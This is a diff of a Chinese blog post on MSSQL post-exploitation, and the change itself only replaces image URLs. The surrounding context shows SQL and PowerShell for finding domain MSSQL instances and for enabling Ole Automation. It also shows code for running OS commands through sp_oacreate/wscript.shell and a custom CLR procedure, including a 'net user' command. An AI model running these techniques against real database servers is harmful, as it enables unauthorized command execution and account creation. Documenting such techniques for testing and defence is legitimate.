@@ -30,7 +30,7 @@ description: 极客兔兔的小站，致力于分享一些技术教程和有趣�
 PowerShell -Command "[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"
 ```
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5dab2c27a372595c61631fcd)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/a_1.png)
 
 基于域环境下mssql实例发现：
 
@@ -42,7 +42,7 @@ PowerShell -Command "[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetData
 setspn -T domain.com -Q */* | findstr "MSSQL"
 ```
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5dab2c48a372595c61631fd7)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/a_2.png)
 
 # 0x03 关于MSSQL实质利用
 
@@ -100,7 +100,7 @@ OUTPUT是返回的对象标记，必须是数据类型为int的局部变量。�
 EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE;
 ```
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5dab2d04b54c8d6b11b3b9c1)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/a_3.png)
 
 实例:
 
@@ -112,7 +112,7 @@ exec sp_oamethod @shell, 'run' , null, 'c:\windows\system32\cmd.exe \c "net user
 
 其中sp_OACreate 创建 OLE 对象 wscript.shell,这个对象也可以是其他ole对象,而 sp_OAMethod 调用 OLE 对象的方法, 如果未使用特定参数，则需要将NULL值作为占位符传递。
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5dab2d4790144e463b1c731f)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/a_4.png)
 
 通过调用`sp_oacreate`能够获得一个数字返回值0（成功）或非零数字（失败），它是OLE自动化对象返回值。
 
@@ -142,7 +142,7 @@ exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c ipconfig > C:
 
 2、创建一个scripting.filesystemobject对象实例，获取对象中opentextfile方法
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5dab2d79b54c8d6b11b3b9e2)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/a_5.png)
 
 语法：
 
@@ -165,7 +165,7 @@ exec @ret = sp_oamethod @y, 'readline', @line out
 END
 ```
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5dab2da732f2ca14fb88e85c)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/a6.png)
 
 同时通过创建数据库表,插入绝对路径文件到字段也是可以实现获取命令输出结果,显然这种方法不是最佳的选择,完整命令如下：
 
@@ -180,7 +180,7 @@ ROWTERMINATOR = 'nn')
 select * from aaaa
 ```
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5dab2dc728011f6d69bc356f)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/a7.png)
 
 ## 二、wscript.shell.exec
 
@@ -192,7 +192,7 @@ select * from aaaa
 
 于是，我尝试跟进wscript.shell对象，枚举出可以调用的方法如下：
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5dab2e3732f2ca14fb88e892)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/a8.png)
 
 ```
 CreateShortcut 
@@ -208,7 +208,7 @@ Exec
 
 其中run的返回值是一个整数，而exec方法的返回值是一个对象，从返回对象中可以取到控制台错误和控制台信息，即stdout和stderr属性。
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5dab2eab28011f6d69bc35b4)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/a9.png)
 
 故成功通过调用wscript.shell实例exec中stdout实现无文件落地回显命令：
 
@@ -222,7 +222,7 @@ exec sp_oamethod @text, 'ReadAll', @str out
 select @str
 ```
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5dab2ee06d67ff07ef514114)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/a10.png)
 
 到此，成功通过sp_oacreate 回显执行命令,与xp_cmdeshell无差。
 
@@ -277,7 +277,7 @@ public partial class StoredProcedures
 
 由于笔者这里用的是2008 R2版本的数据库，故使用低版本.net 3.5编译 ,并将生成后的文件内容转换成十六进制字符串进行存储
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5dab2f28a372595c616320a8)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/a12.png)
 
 启用当前数据库CLR功能
 
@@ -310,6 +310,8 @@ CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME 
 ```
 EXEC[dbo].[cmd_exec] 'whoami'
 ```
+
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/a11.png)
 
 ## 0x04 防御措施
 
